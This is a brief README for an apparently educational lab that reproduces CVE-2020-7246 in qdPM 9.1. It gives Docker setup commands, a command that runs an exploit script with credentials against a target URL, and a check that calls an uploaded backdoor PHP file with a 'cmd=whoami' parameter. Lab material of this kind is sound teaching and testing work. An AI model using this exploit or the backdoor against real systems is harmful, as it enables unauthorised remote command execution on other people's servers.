# CVE-2020-7246 (qdPM 9.1)

For educational purposes only.

See Reference for the details.


## Run
```
$ git clone https://github.com/arafatansari/SecAssignment.git
$ cd SecAssignment
$ docker build -t cve-assignment:ine .
$ docker run -it -p 80:80 cve-assignment:ine
$ service apache2 start | service mysql start
```

## Exploit
```
$ python Exploit/exploit.py -url http://{target-ip}/qdpm/ -u test@localhost.com -p password
```

## Check (exploited)
```
$ http://{target-ip}/qdpm/uploads/users/xxxx-backdoor.php?cmd=whoami
```
